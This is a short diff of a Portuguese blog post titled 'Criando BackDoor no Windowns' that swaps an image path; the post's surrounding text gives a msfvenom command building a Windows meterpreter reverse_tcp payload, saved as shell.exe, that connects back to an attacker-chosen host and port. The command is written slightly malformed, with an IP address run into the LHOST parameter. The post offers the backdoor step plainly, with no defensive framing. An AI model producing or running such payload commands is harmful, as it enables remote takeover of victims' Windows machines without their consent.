@@ -3,7 +3,7 @@ layout: post
 title: Criando BackDoor no Windowns
 date: 2016-07-11T12:16:44.000Z
 ---
-<img src='/images/fulls/backdoor-01.jpg'>
+<img src='/images/fulls/back.jpg'>
 
 -Comandos para criar a backdoor:
 #msfvenom -p windows/meterpreter/reverse_tcp 192.168.0.104LHOST=(SeuIP) LPORT=443 -f exe > /root/Desktop/shell.exe 
